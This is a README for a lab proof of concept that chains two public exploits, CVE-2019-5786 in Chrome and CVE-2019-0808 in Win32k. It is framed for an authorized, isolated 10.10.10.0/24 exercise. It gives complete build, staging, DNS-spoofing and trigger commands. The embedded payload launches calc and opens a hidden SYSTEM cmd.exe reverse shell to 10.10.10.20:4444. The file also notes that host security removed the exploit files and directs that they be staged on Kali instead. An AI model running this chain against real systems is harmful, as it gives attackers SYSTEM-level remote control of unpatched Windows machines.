# CVE-2019-5786 / CVE-2019-0808 isolated-lab PoC

This directory adapts the public Exodus Intelligence chain for the fixed,
isolated `10.10.10.0/24` lab described in the project README.

After preparation, the only victim-side action is opening the wrapper URL in
the vulnerable Chrome browser. The page automatically starts the browser and
Win32k chain. On success, the SYSTEM-stage DLL directly:

1. starts `calc.exe`; and
2. connects from `10.10.10.30` to `10.10.10.20:4444`.

No `p.exe` download, staged executable, disk drop, persistence, credential
access, discovery, configurable callback, or retry loop is used.

## Command-shell detail

No Command Prompt window is displayed. A normal interactive Windows reverse
shell still needs a command interpreter, so the embedded payload starts a
hidden `cmd.exe` with its standard handles attached to the fixed socket. If a
`cmd.exe` process itself is prohibited, this must instead be a non-shell,
one-shot identity callback.

## Pinned sources

- CVE chain: `https://github.com/exodusintel/CVE-2019-0808`
- CVE commit: `c95c8123fe37ea34b82f7560ae683bde7889d4eb`
- sRDI: `https://github.com/monoxgas/sRDI`
- sRDI commit: `9fdd5c44383039519accd1e6bac4acd5a046a92c`

The upstream `exploit.js` and generated `shellcode.js` are intentionally not
stored in the Windows workspace. Host security previously removed those files;
do not disable or bypass it. Generate and stage them in Kali instead.

## Local files

- `payload/payload.c`: Calculator plus fixed callback, exported as
  `RunEmbeddedPayload()` for direct linkage into the SYSTEM-stage DLL.
- `scripts/build.py`: verifies both pinned repositories, replaces exactly one
  upstream `WinExec("cmd.exe", 1)` call, builds an x86 DLL, converts it with
  sRDI, and generates `shellcode.js`.
- `scripts/encode_shellcode.py`: converts an already verified raw
  `shellcode.bin` to the required JavaScript format inside Kali.
- `scripts/prepare_runtime.py`: verifies the CVE repository commit and stages
  only `exploit.js` and `shellcode.js`.
- `scripts/lab_http_server.py`: serves the wrapper and exploit from two paired
  lab host names.
- `scripts/verify_callback.py`: accepts one connection from `10.10.10.30`,
  sends only `whoami` and `exit`, and requires `NT AUTHORITY\SYSTEM`.

## Reference build

The embedded DLL and raw sRDI shellcode were built on 2026-11-12 with the
official llvm-mingw 20261104 toolchain and statically checked for PE32/I386 and
the fixed lab markers.

```text
FullChainEmbedded.dll
  Size:   40448 bytes
  SHA256: 6223bcb920ec5285666fe1f97a8dcd8a2317691cf55fb5fecd6d3631312a11d5

shellcode.bin
  Size:   43480 bytes
  SHA256: ac87d0ee2e40c5c6f4e319a095d9ad62c99ddb26677cad7a3aaa1c7ffe902ee7

shellcode.js generated in Kali
  Size:   130470 bytes
  SHA256: 671a04392842e4a9861f3f9035d70c2c87b579cfecfce24230d6f1322d9d42b4
```

The DLL and raw shellcode contain `calc.exe`, `cmd.exe`, `10.10.10.20`, and
`WS2_32.dll`. The build rejects `Downloads`, `p.exe`, PowerShell, and HTTP URL
markers.

## Prepare in Kali using the reference raw shellcode

Copy this `poc` directory into Kali local storage. Do not serve directly from a
temporary shared folder. While Kali alone has temporary NAT access, clone and
pin the public trigger:

```bash
cd ~
git clone https://github.com/exodusintel/CVE-2019-0808.git upstream-cve-2019-0808
git -C upstream-cve-2019-0808 checkout --detach \
  c95c8123fe37ea34b82f7560ae683bde7889d4eb
test "$(git -C upstream-cve-2019-0808 rev-parse HEAD)" = \
  c95c8123fe37ea34b82f7560ae683bde7889d4eb

cd ~/isproject-poc-embedded
sha256sum build/FullChainEmbedded.dll build/shellcode.bin
python3 scripts/encode_shellcode.py \
  build/shellcode.bin build/shellcode.js
python3 scripts/prepare_runtime.py \
  ~/upstream-cve-2019-0808 --build-dir build
sha256sum -c MANIFEST.sha256
python3 -m unittest discover -s tests -v
```

The final `host2_single_run` root must contain `exploit.js` and `shellcode.js`
but no `p.exe`.

## Rebuild the embedded shellcode in Kali

This is only needed when changing the payload source. Install an x86-capable
Clang/MinGW environment, then clone and pin sRDI:

```bash
sudo apt update
sudo apt install -y clang mingw-w64 git python3
git clone https://github.com/monoxgas/sRDI.git ~/srdi
git -C ~/srdi checkout --detach \
  9fdd5c44383039519accd1e6bac4acd5a046a92c

cd ~/isproject-poc-embedded
python3 scripts/build.py \
  --upstream-root ~/upstream-cve-2019-0808 \
  --srdi-root ~/srdi \
  --compiler "$(command -v clang++)"
python3 scripts/prepare_runtime.py \
  ~/upstream-cve-2019-0808 --build-dir build
```

The build fails unless both repository commits match exactly and the upstream
source contains exactly one expected replacement point.

## Return to the isolated topology

Before serving or triggering the PoC:

- shut down Kali;
- remove temporary NAT and shared folders;
- start Kali through GNS3 again; and
- verify there is no external default route.

The expected final Kali route is only the isolated subnet:

```text
10.10.10.0/24 dev eth0 ... src 10.10.10.20
```

Do not connect the Windows victim to NAT. The final topology contains only the
single GNS3 switch and one lab NIC per VM.

## Serve the transparent portal flow

Only during the authorized, isolated exercise, configure the victim's spoofed
DNS answers so both names resolve to Kali `10.10.10.20`:

```text
portal.lab.test      -> 10.10.10.20
exp.portal.lab.test  -> 10.10.10.20
```

The authoritative DNS configuration remains `portal.lab.test -> 10.10.10.80`.
The direct IP is used for the final redirect so the temporary spoof cannot
create a loop.

Start the unprivileged HTTP server on Kali:

```bash
cd ~/isproject-poc-embedded
python3 scripts/lab_http_server.py
```

To let the victim omit `:8000`, add this narrowly scoped temporary port rule on
the Kali GNS3 interface:

```bash
sudo iptables -t nat -A PREROUTING -i eth0 -p tcp \
  -d 10.10.10.20 --dport 80 -j REDIRECT --to-ports 8000
```

Then start the bounded verifier in a second Kali terminal:

```bash
cd ~/isproject-poc-embedded
python3 scripts/verify_callback.py
```

The HTTP server listens on `10.10.10.20:8000` and writes `http-access.log`.
The temporary port rule exposes it as port 80 to the victim. Different wrapper
and exploit host names are still required for the upstream Site Isolation retry
technique.

## Trigger from Windows

In the vulnerable victim Chrome browser, open only:

```text
http://portal.lab.test/
```

`exploit.html` already calls `exploit()` automatically on page load. No payload
download or manual executable launch is required. The wrapper visibly labels
the page as an authorized security lab. After a browser-level `SUCCESS` message,
it waits 10 seconds and redirects to the normal portal at
`http://10.10.10.80/`. That browser message is not proof of a SYSTEM callback;
use the verifier output below as the final evidence.

Success requires all of the following:

- Calculator appears on the victim.
- `verify_callback.py` accepts a connection sourced by `10.10.10.30`.
- The callback output contains `NT AUTHORITY\SYSTEM`.
- `http-access.log` records the paired wrapper and exploit requests.

The exploit is probabilistic and can crash the renderer or VM. Stop after one
verified success, record hashes and timestamps, and restore the intended
VirtualBox snapshot.

Remove the temporary port rule after the exercise, then restore the normal DNS
and ARP state:

```bash
sudo iptables -t nat -D PREROUTING -i eth0 -p tcp \
  -d 10.10.10.20 --dport 80 -j REDIRECT --to-ports 8000
```

## Victim baseline already observed

The victim had Chrome `72.0.3626.119 (32-bit)` and was missing the April 2019
CVE-2019-0808 fixes. It did not match the project README's exact KB baseline,
so do not label the result as the exact `VULN-BOTH` baseline until the installed
KB list is corrected and rechecked.

## Attribution

The browser and Win32k chain originates from Exodus Intelligence. Local changes
are limited to direct embedding of the fixed lab payload, paired lab host names,
bounded verification, and reproducible staging scripts.
